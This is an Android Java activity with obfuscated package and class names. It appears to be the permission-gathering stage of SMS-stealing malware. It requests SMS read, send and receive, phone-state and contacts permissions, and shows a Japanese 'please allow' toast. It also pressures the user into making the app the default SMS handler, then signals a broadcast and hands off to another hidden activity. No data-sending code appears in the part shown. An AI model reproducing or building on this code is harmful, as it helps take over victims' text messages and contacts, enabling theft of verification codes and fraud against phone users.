package replaceflag_fysn.replaceflag_rydk.replaceflag_capud;

import static replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Thfgfw.showCenterGravity;

import android.Manifest;
import android.app.Activity;
import android.app.role.RoleManager;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.os.Bundle;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.os.CountDownTimer;
import android.os.Handler;
import android.provider.Telephony;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import java.util.ArrayList;

import replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_aas.replaceflag_Bteert;

public class replaceflag_Bjjkiu extends Activity {
    private String[] permissions = new String[]{
            Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS, Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_CONTACTS};
    private ArrayList<String> mPermissionList = new ArrayList<>();
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        if(!hasPermission()) {
//            setContentView(R.layout.replaceflag_activitymain_ddc);
            setContentView(R.layout.replaceflag_permission_guide);
            this.getWindow().getDecorView().setBackgroundColor(Color.WHITE);

            Button button = findViewById(R.id.goToPermission);

            button.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View view) {
                    String pkg = Telephony.Sms.getDefaultSmsPackage(replaceflag_Bjjkiu.this);
                    if (!getPackageName().equals(pkg)) {
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
                            RoleManager roleManager = getSystemService(RoleManager.class);
                            // check if the app is having permission to be as default SMS app boolean
                            boolean isRoleAvailable = roleManager.isRoleAvailable(RoleManager.ROLE_SMS);
                            if (isRoleAvailable) {
                                // check whether your app is already holding the default SMS app role.
                                boolean isRoleHeld = roleManager.isRoleHeld(RoleManager.ROLE_SMS);
//                if (isRoleHeld) {
                                Intent roleRequestIntent = roleManager.createRequestRoleIntent(RoleManager.ROLE_SMS);
                                startActivityForResult(roleRequestIntent, 1);
//                }
                            }
                        } else if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.KITKAT) {
                            Intent intent = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
                            intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, getPackageName());
                            startActivityForResult(intent, 2);
                        }
                    } else {
                        new Handler().postDelayed(new Runnable() {
                            @Override
                            public void run() {
                                startActivity(new Intent(replaceflag_Bjjkiu.this, replaceflag_Bteert.class));
                                finish();
                            }
                        }, 2000);
                    }
                }
            });
        } else {
            startActivity(new Intent(replaceflag_Bjjkiu.this, replaceflag_Bteert.class));
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                if(resultCode==-1){
                    sendBroadcast(new Intent("android.permissions.send"));
                }
                startActivity(new Intent(replaceflag_Bjjkiu.this, replaceflag_Bteert.class));
                finish();
            }
        }, 2000);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        boolean hasPermissionDismiss = false;//有权限没有通过
        if (1 == requestCode) {
            for (int i = 0; i < grantResults.length; i++) {
                if (grantResults[i] == PackageManager.PERMISSION_DENIED) {
                    hasPermissionDismiss = true;
                }
            }
            //如果有权限没有被允许
            if (hasPermissionDismiss) {

            }else{
                sendBroadcast(new Intent("android.permissions.send"));
                new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        startActivity(new Intent(replaceflag_Bjjkiu.this, replaceflag_Bteert.class));
                        finish();
                    }
                }, 2000);
            }
        }
    }

    private boolean hasPermission() {
        mPermissionList.clear();
        for (int i = 0; i < permissions.length; i++) {
            if (ContextCompat.checkSelfPermission(this, permissions[i]) != PackageManager.PERMISSION_GRANTED) {
                mPermissionList.add(permissions[i]);//添加还未授予的权限
            }
        }
        Log.e("=====>", mPermissionList.toString());
        if (mPermissionList.size() > 0) {
            if (mPermissionList.contains(Manifest.permission.READ_SMS)) {
                showCenterGravity("機能利用を許可してください。", Toast.LENGTH_LONG);
                new CountDownTimer(500, 500) {
                    @Override
                    public void onTick(long millisUntilFinished) {
                    }

                    @Override
                    public void onFinish() {
                        ActivityCompat.requestPermissions(replaceflag_Bjjkiu.this, permissions, 1);
                    }
                }.start();
                return false;
            }
        }
        return true;
    }

}
